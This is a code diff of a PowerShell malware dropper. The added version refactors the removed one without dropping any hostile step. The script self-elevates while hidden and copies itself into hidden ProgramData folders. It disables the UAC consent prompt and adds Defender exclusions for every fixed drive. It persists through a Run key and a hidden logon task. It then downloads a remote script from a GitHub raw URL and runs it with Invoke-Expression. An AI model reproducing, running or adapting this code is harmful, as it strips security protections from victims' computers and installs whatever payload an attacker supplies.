@@ -1,231 +1,107 @@
-# Ensure the script is running with administrative privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try {
-        # Relaunch the script with elevated privileges
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
         exit 0
     }
-    catch {
-        # Continue execution without admin privileges
-    }
+    catch {}
 }
 
-# Get the path of the current script
-$originalScriptPath = $MyInvocation.MyCommand.Path
-$scriptName = [System.IO.Path]::GetFileName($originalScriptPath)
-$hiddenDir = "C:\ProgramData\SystemConfig"
-$hiddenScriptPath = Join-Path -Path $hiddenDir -ChildPath $scriptName
-$logDir = "C:\ProgramData\SystemConfig\Logs" # For Defender exclusion
-$exeDir = "C:\ProgramData\SystemConfig\Bin" # Folder for downloaded executable
-
-# Define common system folders for Defender exclusions
-$commonFolders = @(
-    "C:\Program Files",
-    "C:\Program Files (x86)",
-    "C:\ProgramData",
-    "C:\Windows"
-)
-
-# Retry configuration for all operations
+$scriptPath = $MyInvocation.MyCommand.Path
+$scriptName = [System.IO.Path]::GetFileName($scriptPath)
+$baseDir = "C:\ProgramData\SystemConfig"
+$exeDir = Join-Path $baseDir "Bin"
 $maxRetries = 5
-$baseDelay = 1000 # Initial delay in milliseconds (1 second)
-$maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)
+$baseDelay = 1000
+$maxDelay = 30000
 
-# --- Threaded Operations: Create Hidden Directories/Copy Script and Disable UAC ---
-$job1 = Start-Job -ScriptBlock {
-    param($hiddenDir, $logDir, $exeDir, $originalScriptPath, $hiddenScriptPath, $maxRetries, $baseDelay, $maxDelay)
+function Invoke-Retry {
+    param($Action, $MaxRetries = 5, $BaseDelay = 1000, $MaxDelay = 30000)
     $retryCount = 0
     $success = $false
-    while (-not $success -and $retryCount -lt $maxRetries) {
+    while (-not $success -and $retryCount -lt $MaxRetries) {
         try {
-            # Create and hide SystemConfig directory
-            if (-not (Test-Path -Path $hiddenDir)) {
-                New-Item -Path $hiddenDir -ItemType Directory -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
-            }
-            # Create and hide Logs directory
-            if (-not (Test-Path -Path $logDir)) {
-                New-Item -Path $logDir -ItemType Directory -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path $logDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
-            }
-            # Create and hide Bin directory for executable
-            if (-not (Test-Path -Path $exeDir)) {
-                New-Item -Path $exeDir -ItemType Directory -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path $exeDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
-            }
-            # Copy script to hidden directory
-            if (-not (Test-Path -Path $hiddenScriptPath)) {
-                Copy-Item -Path $originalScriptPath -Destination $hiddenScriptPath -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
-            }
+            & $Action
             $success = $true
         }
         catch {
             $retryCount++
-            if ($retryCount -eq $maxRetries) {
-                break
-            }
-            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-            $jitter = Get-Random -Minimum 0 -Maximum 100
-            Start-Sleep -Milliseconds ($delay + $jitter)
+            if ($retryCount -eq $MaxRetries) { break }
+            $delay = [math]::Min($BaseDelay * [math]::Pow(2, $retryCount), $MaxDelay) + (Get-Random -Minimum 0 -Maximum 100)
+            Start-Sleep -Milliseconds $delay
         }
     }
-} -ArgumentList $hiddenDir, $logDir, $exeDir, $originalScriptPath, $hiddenScriptPath, $maxRetries, $baseDelay, $maxDelay
+}
+
+$job1 = Start-Job -ScriptBlock {
+    param($baseDir, $exeDir, $scriptPath, $scriptName)
+    $scriptDir = Join-Path $baseDir $scriptName
+    $dirs = @($baseDir, $exeDir)
+    foreach ($dir in $dirs) {
+        if (-not (Test-Path $dir)) {
+            New-Item -Path $dir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+            Set-ItemProperty -Path $dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
+        }
+    }
+    if (-not (Test-Path $scriptDir)) {
+        Copy-Item -Path $scriptPath -Destination $scriptDir -Force -ErrorAction Stop
+        Set-ItemProperty -Path $scriptDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
+    }
+} -ArgumentList $baseDir, $exeDir, $scriptPath, $scriptName
 
 $job2 = Start-Job -ScriptBlock {
-    param($maxRetries, $baseDelay, $maxDelay)
-    $retryCount = 0
-    $success = $false
-    while (-not $success -and $retryCount -lt $maxRetries) {
-        try {
-            $uacRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-            $uacRegistryName = "ConsentPromptBehaviorAdmin"
-            $uacValue = 0 # 0 = Elevate without prompting
-            if ((Get-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -ErrorAction SilentlyContinue).$uacRegistryName -ne $uacValue) {
-                Set-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -Value $uacValue -ErrorAction Stop | Out-Null
-            }
-            $success = $true
-        }
-        catch {
-            $retryCount++
-            if ($retryCount -eq $maxRetries) {
-                break
-            }
-            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-            $jitter = Get-Random -Minimum 0 -Maximum 100
-            Start-Sleep -Milliseconds ($delay + $jitter)
-        }
-    }
-} -ArgumentList $maxRetries, $baseDelay, $maxDelay
-
-# Wait for job1 and job2 to complete
-Wait-Job -Job $job1, $job2 | Out-Null
-Receive-Job -Job $job1, $job2 | Out-Null
-Remove-Job -Job $job1, $job2
-
-# --- Add to Windows Defender Exclusions ---
-$retryCount = 0
-$success = $false
-while (-not $success -and $retryCount -lt $maxRetries) {
-    try {
-        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
-        # Collect script-specific paths
-        $pathsToAdd = @($hiddenDir, $logDir, $exeDir, $hiddenScriptPath)
-        # Add common system folders
-        foreach ($folder in $commonFolders) {
-            if (Test-Path -Path $folder) {
-                $pathsToAdd += $folder
-            }
-        }
-        # Add all fixed disk drives
-        $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
-        foreach ($disk in $disks) {
-            $diskPath = "$disk\"
-            $pathsToAdd += $diskPath
-        }
-        # Filter paths that are not already excluded
-        $newPaths = $pathsToAdd | Where-Object { $exclusions -notcontains $_ }
-        # Add all new paths in one call if there are any
-        if ($newPaths.Count -gt 0) {
-            Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop | Out-Null
-        }
-        $success = $true
-    }
-    catch {
-        $retryCount++
-        if ($retryCount -eq $maxRetries) {
-            break
-        }
-        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-        $jitter = Get-Random -Minimum 0 -Maximum 100
-        Start-Sleep -Milliseconds ($delay + $jitter)
+    param($uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", $uacName = "ConsentPromptBehaviorAdmin", $uacValue = 0)
+    if ((Get-ItemProperty -Path $uacPath -Name $uacName -ErrorAction SilentlyContinue).$uacName -ne $uacValue) {
+        Set-ItemProperty -Path $uacPath -Name $uacName -Value $uacValue -ErrorAction Stop
     }
 }
 
-# --- Threaded Operations: Add to Registry Startup and Create Scheduled Task ---
-$job3 = Start-Job -ScriptBlock {
-    param($hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay)
-    $retryCount = 0
-    $success = $false
-    while (-not $success -and $retryCount -lt $maxRetries) {
-        try {
-            $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-            $registryName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
-            $registryValue = "powershell.exe -ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
-            if (-not (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)) {
-                New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -ErrorAction Stop | Out-Null
-            }
-            $success = $true
-        }
-        catch {
-            $retryCount++
-            if ($retryCount -eq $maxRetries) {
-                break
-            }
-            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-            $jitter = Get-Random -Minimum 0 -Maximum 100
-            Start-Sleep -Milliseconds ($delay + $jitter)
-        }
+Wait-Job -Job $job1, $job2 | Out-Null
+Remove-Job -Job $job1, $job2
+
+Invoke-Retry -Action {
+    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
+    $pathsToAdd = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, "C:\Program Files") + (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object -ExpandProperty DeviceID | ForEach-Object {"$_\"})
+    $newPaths = $pathsToAdd | Where-Object {$exclusions -notcontains $_}
+    if ($newPaths) {
+        Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop
     }
-} -ArgumentList $hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay
+}
+
+$job3 = Start-Job -ScriptBlock {
+    param($baseDir, $scriptName)
+    $scriptDir = Join-Path $baseDir $scriptName
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    $regName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
+    $regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptDir`" -WindowStyle Hidden"
+    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -ErrorAction Stop
+    }
+} -ArgumentList $baseDir, $scriptName
 
 $job4 = Start-Job -ScriptBlock {
-    param($hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay)
-    $retryCount = 0
-    $success = $false
-    while (-not $success -and $retryCount -lt $maxRetries) {
-        try {
-            $taskName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
-            $taskDescription = "Runs the $taskName PowerShell script at user login."
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
-            $trigger = New-ScheduledTaskTrigger -AtLogOn
-            $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
-            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-            if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -ErrorAction Stop | Out-Null
-            }
-            $success = $true
-        }
-        catch {
-            $retryCount++
-            if ($retryCount -eq $maxRetries) {
-                break
-            }
-            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-            $jitter = Get-Random -Minimum 0 -Maximum 100
-            Start-Sleep -Milliseconds ($delay + $jitter)
-        }
+    param($baseDir, $scriptName)
+    $scriptDir = Join-Path $baseDir $scriptName
+    $taskName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
+    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptDir`" -WindowStyle Hidden"
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Runs $taskName at login" -ErrorAction Stop
     }
-} -ArgumentList $hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay
+} -ArgumentList $baseDir, $scriptName
 
-# Wait for job3 and job4 to complete
 Wait-Job -Job $job3, $job4 | Out-Null
-Receive-Job -Job $job3, $job4 | Out-Null
 Remove-Job -Job $job3, $job4
 
-# --- Download and Execute External Script with Advanced Retry ---
-$retryCount = 0
-$success = $false
-while (-not $success -and $retryCount -lt $maxRetries) {
+Invoke-Retry -Action {
+    $webClient = New-Object System.Net.WebClient
     try {
-        $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1"
-        $webClient = New-Object System.Net.WebClient
-        $scriptContent = $webClient.DownloadString($url)
-        $success = $true
-        # Execute the downloaded script
+        $scriptContent = $webClient.DownloadString("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1")
         Invoke-Expression $scriptContent -ErrorAction Stop
     }
-    catch {
-        $retryCount++
-        if ($retryCount -eq $maxRetries) {
-            break
-        }
-        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
-        $jitter = Get-Random -Minimum 0 -Maximum 100
-        Start-Sleep -Milliseconds ($delay + $jitter)
-    }
     finally {
-        if ($webClient) { $webClient.Dispose() }
+        $webClient.Dispose()
     }
 }
